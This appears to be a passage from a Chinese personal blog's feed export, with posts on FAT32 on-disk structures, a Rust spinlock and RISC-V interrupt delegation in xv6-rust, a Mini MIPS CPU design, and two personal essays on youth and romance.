<p>下表显示了 FAT 值的范围和每种 FAT 类型的含义:</p>
<table>
<thead>
<tr>
<th>FAT12</th>
<th>FAT16</th>
<th>FAT32</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x000</td>
<td>0x000</td>
<td>0x00000000</td>
<td>自由</td>
</tr>
<tr>
<td>0x001</td>
<td>0x0001</td>
<td>0x00000001</td>
<td>保留</td>
</tr>
<tr>
<td>0x002 - 0xFF6</td>
<td>0x0002 - 0xFFF6</td>
<td>0x00000002 - 0x0FFFFFF6</td>
<td>使用中（下一个链接的值）</td>
</tr>
<tr>
<td>0xFF7</td>
<td>0xFFF7</td>
<td>0x0FFFFFF7</td>
<td>坏簇</td>
</tr>
<tr>
<td>0xFF8 - 0xFFF</td>
<td>0xFFF8 - 0xFFFF</td>
<td>0x0FFFFFF8 - 0x0FFFFFF</td>
<td>使用中（链尾部）</td>
</tr>
</tbody>
</table>
<p><strong>Note:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data_sectors &#x3D; total_sectors - (reserved_sectors_cnt + (fat_nums * fat_size)) -2 ?</span><br><span class="line">count_of_clusters &#x3D; data_sectors &#x2F; sectors_per_clusters</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fat_offset &#x3D; N * 4(N为簇号)</span><br><span class="line">fat_sectors_offset &#x3D; reserved_sectors_count + (fat_offset &#x2F; bytes_per_sectors)</span><br><span class="line">fat_entry_offset &#x3D; fat_offset % bytes_per_sectors</span><br></pre></td></tr></table></figure>
<p>FAT32 Entry 的高4 bit 是不被使用的。</p>
<p>我们知道，FAT32 文件系统数据簇的前两个簇被设置为保留的簇，那么FAT 的前两个 entry 应当被设置为什么呢？对于FAT32 文件系统来说，FAT[0] = 0x0FFFFFF8，第二个保留簇 FAT[1] 由 FORMAT 设置为 EOC 标志，对于 FAT32 来说，文件系统驱动程序可以使用 FAT[1] entry 高两位作为脏卷标志（所有其他位始终设置为1）。</p>
<p>clean_shut_bit_mask = 0x080000000;</p>
<ul>
<li>bit 为 1 表明clean</li>
<li>bit 为 0 表明 dirty</li>
</ul>
<p>hard_err_bit_mask = 0x04000000；</p>
<ul>
<li>bit 为 1 表明 没有磁盘IO错误</li>
<li>bit 为 0 表明发生了磁盘IO错误</li>
</ul>
<h2 id="fat-volume-initialization"><a class="markdownIt-Anchor" href="#fat-volume-initialization"></a> FAT Volume Initialization</h2>
<h2 id="fat-directory-structure"><a class="markdownIt-Anchor" href="#fat-directory-structure"></a> FAT Directory Structure</h2>
<p>FAT 目录是一个文件，由一个32 bytes 所组成的线性表组成。而根目录是一个较为特殊的存在。</p>
<p>对于 FAT32 来说， 根目录是可变大小并且是一个簇链，这点和其他的目录项相同。 FAT32 volume 根目录第一个簇存储在 root_cluster 中， 任何 FAT 类型上的根目录本身都没有任何日期或时间戳，没有文件名（隐含文件名 “/” 除外），也不包括&quot;.&quot; 和 “…”。 根目录的一个特殊之处在于他的文件设置了 volume_id_attr 属性的标志位。</p>
<table>
<thead>
<tr>
<th>域</th>
<th>偏移量</th>
<th>大小</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>name</td>
<td>0</td>
<td>11</td>
<td></td>
</tr>
<tr>
<td>attribute</td>
<td>11</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>NT_reverse</td>
<td>12</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>creation_time_tenth</td>
<td>13</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>creation_time</td>
<td>14</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>creation_date</td>
<td>16</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>last_access_date</td>
<td>18</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>first_cluster_high</td>
<td>20</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>write_time</td>
<td>22</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>write_date</td>
<td>24</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>first_cluster_low</td>
<td>26</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>file_size</td>
<td>28</td>
<td>4</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Note</strong></p>
<p>name[0] = 0xE5, 表明该目录项是空的</p>
<p>name[0] = 0x00, 同样表明目录项为空，同时目录项的剩余部分都为空</p>
<p>name[0] = 0x05，表明该目录项表示为 0xE5 的字符</p>
<p>接下来字符在 dir_name 中无效：</p>
<ul>
<li>小于 0x20 除了0x05</li>
<li>·0x22, 0x2A, 0x2B, 0x2C, 0x2E, 0x2F, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x5B, 0x5C, 0x5D, a和 0x7C.</li>
</ul>
<p>当 attribute 字段为 ATTR_DIRECTORY 时表明该 entry 为一个目录 (0x10)，此时应设置 file_size 属性为0表明 file_size 不被使用，通过跟随它的 cluster 直到找到 EOC标志。</p>
<p>一个簇分配给该目录，然后将first_cluster_low 和 first_cluster_high 设置为该簇号，并在 FAT 的该簇条目放置一个 EOC 标记。接下来，将该簇的所有字节初始化为0，如果该目录不是根目录，如果该目录不是根目录，你需要在该目录的前32字节的 Directory Entry (即刚刚分配的 cluster 的数据区域的前2个32字节区域)创建两个特殊条目。</p>
<p>这两个目录条目即为 ‘.’ 和 ‘…’。</p>
<h2 id="fat-long-directory-entries"><a class="markdownIt-Anchor" href="#fat-long-directory-entries"></a> FAT Long Directory Entries</h2>
<p>每个长目录项必须和一个短目录项进行配合使用</p>
<table>
<thead>
<tr>
<th>域</th>
<th>偏移量</th>
<th>大小</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>dir_order</td>
<td>0</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>dir_name1</td>
<td>1</td>
<td>10</td>
<td>长目录项名字第一到第五个字符</td>
</tr>
<tr>
<td>dir_attr</td>
<td>11</td>
<td>1</td>
<td>必须为Attr_Long_Name</td>
</tr>
<tr>
<td>dir_type</td>
<td>12</td>
<td>1</td>
<td>若为0则表示该目录条目为目录条目的子组件</td>
</tr>
<tr>
<td>dir_checksum</td>
<td>13</td>
<td>1</td>
<td>长目录末尾的短目录项名称的校验和</td>
</tr>
<tr>
<td>dir_name2</td>
<td>14</td>
<td>12</td>
<td>6-11字符</td>
</tr>
<tr>
<td>first_cluster_low</td>
<td>26</td>
<td>2</td>
<td>必须为0</td>
</tr>
<tr>
<td>dir_name3</td>
<td>28</td>
<td>4</td>
<td>12-13字符</td>
</tr>
</tbody>
</table>
<p>为了兼容型设计，长目录条目与短目录条目必须成对出现，并且在长目录条目在物理上在短目录条目之前并且连续。</p>
<p>首先，一组目录长条目的每个成员都被唯一编号，并且该组的最后一个成员是 dir_ord 并且带有一个标志，表明它是该组的最后一个成员。dir_ord 字段用于此进行确定，集合的一个成员的 dir_ord 值设置为1，第 n 个设置为 n 或者 LAST_LONG_ENTRY。请注意，dir_ord 紫端德值不能设置为 0xE5 或者 0x00。文件系统一直使用这些来指示“空闲”目录的最后目录条目。</p>
<p>除此之外，在创建段目录项和长目录项时，对包含在短目录项中的 name 计算8位 checksum。段目录项 name 中的所有11个字符都用于计算 checksum。</p>
<p>校验和计算算法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//	ChkSum()</span></span><br><span class="line"><span class="comment">//	Returns an unsigned byte checksum computed on an unsigned byte</span></span><br><span class="line"><span class="comment">//	array.  The array must be 11 bytes long and is assumed to contain</span></span><br><span class="line"><span class="comment">//	a name stored in the format of a MS-DOS directory entry.</span></span><br><span class="line"><span class="comment">//	Passed:	 pFcbName    Pointer to an unsigned byte array assumed to be</span></span><br><span class="line"><span class="comment">//                          11 bytes long.</span></span><br><span class="line"><span class="comment">//	Returns: Sum         An 8-bit unsigned checksum of the array pointed</span></span><br><span class="line"><span class="comment">//                           to by pFcbName.</span></span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">ChkSum</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *pFcbName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">short</span> FcbNameLen;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> Sum;</span><br><span class="line"></span><br><span class="line">    Sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (FcbNameLen=<span class="number">11</span>; FcbNameLen!=<span class="number">0</span>; FcbNameLen--) &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> The operation is an unsigned char rotate right</span></span><br><span class="line">        Sum = ((Sum &amp; <span class="number">1</span>) ? <span class="number">0x80</span> : <span class="number">0</span>) + (Sum &gt;&gt; <span class="number">1</span>) + *pFcbName++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (Sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1>
<p><a href="https://download.microsoft.com/download/1/6/1/161ba512-40e2-4cc9-843a-923143f3456c/fatgen103.doc">FAT32 File System Specification</a></p>
<p><a href="https://drustz.com/posts/2015/11/17/filesystem/">一步一步了解FAT32文件系统</a></p>
<p><a href="http://elm-chan.org/docs/fat_e.html">FAT Filesystem</a></p>
]]></content>
  </entry>
  <entry>
    <title>xv6-rust锁机制</title>
    <url>/2021/06/09/xv6-rust-lock/</url>
    <content><![CDATA[<h1 id="锁"><a class="markdownIt-Anchor" href="#锁"></a> 锁</h1>
<h2 id="自旋锁spinlock"><a class="markdownIt-Anchor" href="#自旋锁spinlock"></a> 自旋锁（Spinlock）</h2>
<p>我们实现的自旋锁的定义如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug,Default)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">Spinlock</span></span>&lt;T: ?<span class="built_in">Sized</span>&gt;&#123;</span><br><span class="line">    locked:AtomicBool,</span><br><span class="line">    name: &amp;<span class="symbol">&#x27;static</span> <span class="built_in">str</span>,</span><br><span class="line">    cpu_id: Cell&lt;<span class="built_in">isize</span>&gt;,</span><br><span class="line">    data:UnsafeCell&lt;T&gt;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>locked</code>由<code>core::atmoic::AtomicBool</code>来声明，这是一个原子布尔类型，即这是一个线程安全的值。而data的值则有<code>UnsafeCell</code>来包裹（wrap），这表明将有一些不安全的操作将作用在内部包裹的值中，使用该类型我们将没有办法获取内部变量的可变引用。我们可以通过<code>.get()</code>方法获取<code>*mut T</code>来对其内部进行操作。</p>
<p>对于一个锁变量，我们需要对其实现<code>acquire()</code>和<code>release()</code>方法：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">acquire</span></span>(&amp;<span class="keyword">self</span>) -&gt; SpinlockGuard&lt;<span class="symbol">&#x27;_</span>, T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    push_off();</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">self</span>.holding() &#123;</span><br><span class="line">        <span class="built_in">panic!</span>(<span class="string">&quot;acquire&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">self</span>.locked.swap(<span class="literal">true</span>, Ordering::Acquire)&#123;</span><br><span class="line">        <span class="comment">// Now we signals the processor that it is inside a busy-wait spin-loop </span></span><br><span class="line">        spin_loop();</span><br><span class="line">    &#125;</span><br><span class="line">    fence(Ordering::SeqCst);</span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.cpu_id.set(cpuid() <span class="keyword">as</span> <span class="built_in">isize</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SpinlockGuard&#123;spinlock: &amp;<span class="keyword">self</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">release</span></span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> !<span class="keyword">self</span>.holding() &#123;</span><br><span class="line">        <span class="built_in">panic!</span>(<span class="string">&quot;release&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">self</span>.cpu_id.set(-<span class="number">1</span>);</span><br><span class="line">    fence(Ordering::SeqCst);</span><br><span class="line">    <span class="keyword">self</span>.locked.store(<span class="literal">false</span>, Ordering::Release);</span><br><span class="line"></span><br><span class="line">    pop_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在我们的实现中，对于<code>acquire</code>方法，我们首先需要关闭中断并等待获取锁变量并对其进行原子上锁操作，在对变量上锁之后返回一个<code>SpinlockGuard</code>变量。</p>
<p>而对于<code>release</code>方法，我们则首先需要判断当前锁的状态，当锁为<code>acquire</code>状态时我们将其解锁并进行开启中断。</p>
<p>而<code>SpinlockGuard</code>的定义如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">SpinlockGuard</span></span>&lt;<span class="symbol">&#x27;a</span>, T&gt;&#123;</span><br><span class="line">    spinlock:&amp;<span class="symbol">&#x27;a</span> Spinlock&lt;T&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>锁守卫者返回一个锁变量供获得锁的线程进行操作。同时我们对解引用操作符进行重载，从而能够使得获得锁的线程调用data的方法进行操作:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">impl</span>&lt;T&gt; Deref <span class="keyword">for</span> SpinlockGuard&lt;<span class="symbol">&#x27;_</span>, T&gt;&#123;</span><br><span class="line">    <span class="class"><span class="keyword">type</span> <span class="title">Target</span></span> = T;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">deref</span></span>(&amp;<span class="keyword">self</span>) -&gt; &amp;Self::Target &#123;</span><br><span class="line">        <span class="keyword">unsafe</span>&#123;</span><br><span class="line">            &amp;*<span class="keyword">self</span>.spinlock.data.get()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;T&gt; DerefMut <span class="keyword">for</span> SpinlockGuard&lt;<span class="symbol">&#x27;_</span>, T&gt;&#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">deref_mut</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) -&gt; &amp;<span class="keyword">mut</span> Self::Target&#123;</span><br><span class="line">        <span class="keyword">unsafe</span>&#123;</span><br><span class="line">            &amp;<span class="keyword">mut</span> *<span class="keyword">self</span>.spinlock.data.get()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="睡眠锁sleeplock"><a class="markdownIt-Anchor" href="#睡眠锁sleeplock"></a> 睡眠锁（Sleeplock）</h2>
<p>待开发…</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>xv6-rust</tag>
      </tags>
  </entry>
  <entry>
    <title>Mini MIPS 32-bits CPU</title>
    <url>/2021/06/09/Mini-MIPS-32-bits-CPU/</url>
    <content><![CDATA[<h1 id="mini-mips-32-bits-cpu"><a class="markdownIt-Anchor" href="#mini-mips-32-bits-cpu"></a> Mini MIPS 32-bits CPU</h1>
<p>32位单周期MIPS指令集CPU，仅仅支持10条指令：</p>
<ul>
<li>lw, sw</li>
<li>lui, ori, addiu</li>
<li>addu, slt</li>
<li>beq, bne, j</li>
</ul>
<p>具体实现可见：<a href="https://github.com/KuangjuX/Mini-Mips32">Mini-Mips32</a></p>
<h2 id="部件构成"><a class="markdownIt-Anchor" href="#部件构成"></a> 部件构成</h2>
<p>顶层模块：</p>
<p><img src="/2021/06/09/Mini-MIPS-32-bits-CPU/top.jpg" alt></p>
<p>CPU模块：</p>
<p><img src="/2021/06/09/Mini-MIPS-32-bits-CPU/cpu.jpg" alt></p>
<p>控制单元：</p>
<p><img src="/2021/06/09/Mini-MIPS-32-bits-CPU/control_unit.jpg" alt></p>
<p>数据通路：</p>
<p><img src="/2021/06/09/Mini-MIPS-32-bits-CPU/data_path.jpg" alt></p>
<h2 id="控制信号"><a class="markdownIt-Anchor" href="#控制信号"></a> 控制信号</h2>
<table>
<thead>
<tr>
<th>指令</th>
<th>reg_write</th>
<th>reg_dst</th>
<th>alu_src</th>
<th>branch</th>
<th>mem_write</th>
<th>mem_to_reg</th>
<th>aluop</th>
<th>jump</th>
<th>select_imm</th>
</tr>
</thead>
<tbody>
<tr>
<td>R-type</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>00</td>
<td>0</td>
<td>0</td>
<td>100</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>beq</td>
<td>0</td>
<td>x</td>
<td>0</td>
<td>01</td>
<td>0</td>
<td>x</td>
<td>010</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>bne</td>
<td>0</td>
<td>x</td>
<td>0</td>
<td>10</td>
<td>0</td>
<td>x</td>
<td>010</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>j</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>00</td>
<td>0</td>
<td>x</td>
<td>xxx</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>addiu</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>00</td>
<td>0</td>
<td>0</td>
<td>000</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>ori</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>00</td>
<td>0</td>
<td>0</td>
<td>011</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>lui</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>00</td>
<td>0</td>
<td>0</td>
<td>100</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>lw</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>00</td>
<td>0</td>
<td>1</td>
<td>000</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>sw</td>
<td>0</td>
<td>x</td>
<td>1</td>
<td>00</td>
<td>1</td>
<td>x</td>
<td>000</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>invalid_op</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>xx</td>
<td>x</td>
<td>x</td>
<td>xxx</td>
<td>0</td>
<td>x</td>
</tr>
</tbody>
</table>
<h2 id="指令流程"><a class="markdownIt-Anchor" href="#指令流程"></a> 指令流程</h2>
<p><strong>lw</strong></p>
<p><code>lw</code>指令为访存指令，当CPU根据instr解析其为<code>lw</code>指令的时候，首先将instr送入控制单元将其解析并将其控制信号输入数据通路。到达数据通路，首先经过<code>reg_file</code>，在<code>reg_file</code>从<code>a1</code>读入<code>base</code>寄存器的值作为<code>src_a</code>，将<code>instr[15 : 0]</code>符号扩展作为<code>src_b</code>。<code>src_a</code>与<code>src_b</code>经过<code>ALU</code>进行运算，这时<code>alu_control</code>表明进行加法运算，进行运算后作为读内存地址送入RAM并读取该地址的值，在之后将读到的值作为<code>write_reg_data</code>根据<code>instr[20 : 16]</code>作为写入寄存器的编号写到目标寄存器中，随后等下一个时钟沿到来的时候将<code>pc</code>+4并送给<code>iaddr</code>并进行下条指令的取指。</p>
<p><strong>sw</strong></p>
<p>sw指令大体与lw指令相同，不同之处在于从<code>rt</code>的寄存器中取出值将其写入<code>base</code>寄存器加上<code>offset</code>的内存地址中。</p>
<p><strong>lui</strong></p>
<p>lui指令将立即数imm写入寄存器rt的高16位，寄存器rt的低16位置0。在我的实现中，设计了一个<code>select_imm</code>的控制位，当<code>select_imm</code>为1时，将<code>imm</code>放在高16位，低16位置0作为<code>sign_imm</code>。此时ALU不做任何事，仅仅返回<code>src_b</code>。随后将值写入<code>rt</code>寄存器中。</p>
<p><strong>ori</strong></p>
<p>ori指令较为简单，只需从<code>rs</code>中取出值并与<code>sign_imm</code>进行或运算写入<code>rt</code>寄存器即可。</p>
<p><strong>addiu</strong></p>
<p>addiu指令将从<code>rs</code>寄存器中取出的值与<code>sign_imm</code>的值送入ALU相加并写入<code>rt</code>寄存器中。</p>
<p><strong>addu</strong></p>
<p>addu为R类型指令，根据<code>funct</code>来判断其<code>alu_control</code>。此时分别从<code>rs</code>和<code>rd</code>寄存器中取出的值进行相加并将其写入<code>rt</code>寄存器中。</p>
<p><strong>slt</strong></p>
<p>slt寄存器将<code>rs</code>寄存器中的值与<code>rt</code>寄存器中的值进行有符号数比较（此时将通过ALU的比较进行），若<code>rs</code>中的值较小，则将<code>rd</code>寄存器写入1，否则写入0。</p>
<p><strong>beq</strong></p>
<p>beq指令将<code>rs</code>寄存器与<code>rt</code>的寄存器进行比较，若相等则进行分支跳转。此时比较是通过ALU的减法操作来进行的，当zero为0时，则进入分支指令，此时分支指令的地址由<code>offset</code>左移两位进行符号扩展加上该分支指令对应的延迟槽的PC计算得到。</p>
<p><strong>bne</strong></p>
<p>与<code>beq</code>指令大体相同，只不过变为了不相等则跳转。我们<code>branch</code>由两位组成。计算式为<code>alu_res = (zero &amp; branch[0]) | (~zero &amp; branch[1])</code>。</p>
<p><strong>j</strong></p>
<p>无条件跳转，设置<code>jump</code>控制位，任何条件下都进行分支跳转。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>计算机体系结构</tag>
        <tag>CPU</tag>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title>武侠已死</title>
    <url>/2021/06/06/hero-die-now/</url>
    <content><![CDATA[<p>现在再去看武侠小说时，很少再有年少时的那种兴奋感了，这倒不是说我厌恶读武侠小说或者无法在读武侠小说的过程中取得快感了。只是因为我在读小说的过程中更加考虑小说的合理性。比如我会因为某些概率很小的时间在主角出现时接二连三的发生而感到很不适。有时为了逃避这种不适感我会选择掩卷不读。相反在我年少时我完全不会怀疑事件合理与否，看到主角武功大进、扬眉吐气、谈情说爱时（？）都会眉飞色舞。</p>
<p>在知乎看到了这样一篇<a href="https://www.zhihu.com/question/340527763/answer/1669205641">文章</a>，里面的观点很有意思，他说江南的《龙族》越写越差强人意，原因是因为江南的“艺术”已死，他还举了一个刘慈欣《赡养人类》中的一个例子：</p>
<p>一个贫穷的画家拒绝有钱人赠送的钞票，他永远待在一个破解的棚子里面，不管画作画的有多好，当别人想去买的时候，他总是漠不关心地说看着给吧，且每次仅抽取两张钞票，而他的理由是：</p>
<blockquote>
<p>我的画都是描写贫穷与死亡的，如果一夜之间成了百万富翁，我的艺术就死了。    —《赡养人类》</p>
</blockquote>
<p>而在文章的作者给出江南“艺术死亡”的分析是因为江南结婚之后，婚姻幸福、家庭美好、生活顺遂，再也无法遇到生活的不顺与求之不得的感情，他的笔下也就无法刻画出那种细腻的情感了。当他为celina学姐黯然神伤，心有不甘时，当他和女友远渡重洋，昼夜颠倒时，当他孤独无依，挫折重重时他的艺术到达了最高峰。然而当他成功之后，幸福美满的时候却反而无法写出美好的作品了，这难道不是极大的讽刺吗？</p>
<p>细细想来，有很多艺术家都是在生活不顺遂甚至生命都收到威胁时而创作出伟大的艺术品。</p>
<p>虽然我从未看过江南的任何一部作品，但我能够理解乃至共情江南的情感变化，只因为我也同江南有类似的经历，同时在一段时间内也疯狂地写小说输出（那是段痛苦的时光，成为小说家的理想也在那时灰飞烟灭了）。</p>
<p>总而言之，当我在说武侠已死的时候，我在说什么呢？我其实想说的是我的童年时代、少年时代已死了。我已经没有少年时代的那种激情了，我对于天崩地裂的爱情也没有那么狂热的追求了，或者说我依然向往天崩地裂的爱情，但我认为这大概将不会发生在我身上。</p>
<p>还有几天就20岁了。</p>
<p>成年快乐。</p>
<blockquote>
<p>开玩笑的	   —《告白》</p>
</blockquote>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
  </entry>
  <entry>
    <title>520与伤春悲秋与杂感</title>
    <url>/2021/05/21/sad-in-521/</url>
    <content><![CDATA[<p>每次到了这种日子，我总会有一些特殊的感觉。看着别人在QQ空间、朋友圈上形形色色的脱单、分手、秀恩爱之后，我心里总有一些不舒服的滋味。他们的经历好丰富，可是为什么我不能拥有这种经历呢？是啊，尽管在平时，我对这种无聊又琐碎的恋爱嗤之以鼻，认为这种事情会极大地消耗人的精力与耐力，使人会变成不自由的恋爱的附庸。可是，我又何尝不是在某一时刻，对恋爱之时的美好充满幻想呢？</p>
<p>二十年来，我从未尝试去谈过一场恋爱，仅有的也仅仅是无疾而终的暗恋，在无眠的夜里达到高潮而又随着时间的流逝而渐渐淡忘。这就像我曾经疯狂地迷恋上写小说一样，我一度迷恋上写小说但却因为学业被迫放弃，其中经历的思想斗争与辗转反侧十分痛苦，甚至让我一度到达了抑郁的程度。然而随着时间流逝，以前所苦苦追求的，到现在看来都像是笑话一样。那些暗恋过的过往，也云烟散去，那些我喜欢过的女孩子原来也是那么普通和拥有那么多的缺点，原来只是我的头昏脑热罢了。我不看甚至屏蔽了她们的朋友圈，这或许是由盛转衰的报复性行为吧，从西施到普通人还是有很大落差的。</p>
<p>在《霍乱时期的爱情》里记载了一段伟大的恋爱，延续了60多年的暗恋，这虽然很伟大和令人动容，但对我而言，这更像是自残式与斯德哥尔摩式的恋爱，为了一段不知道结果的爱情伤害别人也同样伤害自己。</p>
<p>由于经过了很多的思想斗争与思考，使得我看起来对恋爱与人生的理解都看起来比同龄人更加成熟与悲观，但其实我自己完全没有经历过一段完整的恋爱也没有比其他人经历更多的东西，又谈何更加成熟呢？仔细想想我其实只不过是在其他人面前装成熟罢了，一方面轻视那些不断地恋爱与分手而没有思想底蕴的同龄人，而一方面又自卑于自己没有一段令人向往的恋爱经历，导致我总是想要在他人面前装成人生导师的模样而获取存在感。萨特曾经在《禁闭》中写到过:</p>
<blockquote>
<p>l’enfer, c’est les autres （他人即地狱）</p>
</blockquote>
<p>现在的我，又何尝不是在地狱之中呢？想要在面前彰显自己的成熟与知识，却又因为自己没有别人的经历而感到自卑，使得自己无法正视自己与他人的关系。，使得在无尽的闭环里痛苦万分。</p>
<p>我曾经以为爱情是一件神圣的事情，一个人爱一个人就应当白头偕老，那些因为自己的快感而玩弄感情的人都是混蛋。但这种柏拉图式的爱情观更像是五十年前甚至是一百年前的革命之中才会有的事情。但现代社会中，大概不会有人再拿爱情当做很神圣的事情，很多人恋爱都是广撒网，从网恋开始而瞬间闪恋，而结婚似乎也是到了一定年龄所做的任务一样。他们恋爱仿佛也只是为了恋爱，而从不考虑今后的事情与自己所负的责任，这哪里是我理解的恋爱呢？这简直是强迫症患者啊！他们都发了疯，可我却以为我也发了疯，我到底能不能脱离他人，他人的评价而存在？</p>
<p>科技发达了，经济富裕了，可社会却撕裂了，不仅是阶级撕裂了，连恋爱观都撕裂了。许多人都将活生生的人物化了，就像一个指标一样，不懂得尊重人与爱人的人，最终也会得不到别人尊重。</p>
<p>我真的失望了，从小我是看《金庸全集》长大的，里面描述的爱情给我留下了深刻的印象，可写下这些的作者都不能保证自己的爱情纯粹。我又到那里去追寻自己想要的Romantic呢？但值得庆幸的是，这也使得我可以有更多的时间醉心于我的专业，有更多的时间去观世界和深刻自己的思想。</p>
<p>写于2021.5.21，一个狂人的胡言乱语罢了。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>xv6-rust中断机制</title>
    <url>/2021/05/03/xv6-rust-interrupt/</url>
    <content><![CDATA[<h2 id="内核中断机制"><a class="markdownIt-Anchor" href="#内核中断机制"></a> 内核中断机制</h2>
<h3 id="中断代理"><a class="markdownIt-Anchor" href="#中断代理"></a> 中断代理</h3>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// delegate all interrupts and exceptions to supervisor mode.</span></span><br><span class="line">    medeleg::write(<span class="number">0xffff</span>);</span><br><span class="line">    mideleg::write(<span class="number">0xffff</span>);</span><br><span class="line">    sie::write(sie::read() | sie::SIE::SEIE <span class="keyword">as</span> <span class="built_in">usize</span> | sie::SIE::STIE <span class="keyword">as</span> <span class="built_in">usize</span> | sie::SIE::SSIE <span class="keyword">as</span> <span class="built_in">usize</span>);</span><br></pre></td></tr></table></figure>
<p>首先，我们在bootloader阶段进行中断代理，此时，我们仍处在M特权级，而我们的内核需要运行在S特权级。默认情况下，所有的陷阱中断都会在M态进行处理，因此我们需要将其代理到S态以便我们进行处理。</p>
<p>这里首先简要介绍一下<code>medeleg</code>(machine exception delegation register),<code>mideleg</code>(machine interrupt delegation register)以及<code>sie</code>（supervisor interrupt register）寄存器的作用：</p>
<p><code>medeleg</code>和<code>mideleg</code>表明表明当前的中断或者异常应当处理在更低的特权级。在系统中我们拥有3个特权级（M/S/U），通过设置<code>medeleg</code>和<code>mideleg</code>可以将发生在系统的中断代理到S态进行处理。如果支持U态的话，我们也可以通过设置<code>sedeleg</code>和<code>sideleg</code>寄存器来将中断代理到U态进行处理。</p>
<p>而<code>sie</code>则是中断使能寄存器的意思，0-15位被分配为标准中断原因，16位以上则为特定的平台或者客户端所设置。<br>
